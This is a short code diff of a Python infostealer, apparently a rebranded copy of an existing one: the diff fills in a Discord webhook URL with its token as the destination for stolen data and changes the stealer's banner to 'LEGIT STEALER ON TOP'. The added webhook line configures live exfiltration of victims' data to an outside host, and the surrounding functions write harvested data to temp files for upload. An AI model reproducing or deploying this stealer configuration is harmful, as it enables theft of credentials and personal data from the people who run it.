@@ -20,7 +20,7 @@ import subprocess
 #
 
 
-hook = ""
+hook = "https://discordapp.com/api/webhooks/1322637866567733288/KUBhdeRcSNOUSU8WAmdHfJTyMU652tqHWOmhe-FKKMF5vppL0YUY3S-5H0tNl-cS7Dvx"
 DETECTED = False
 
 
@@ -406,7 +406,7 @@ def upload(name, tk=''):
 def writeforfile(data, name):
     path = os.getenv("TEMP") + f"\wp{name}.txt"
     with open(path, mode='w', encoding='utf-8') as f:
-        f.write(f"<--ACEE STEALER ON TOP-->\n\n")
+        f.write(f"<--LEGIT STEALER ON TOP-->\n\n")
         for line in data:
             if line[0] != '':
                 f.write(f"{line}\n")
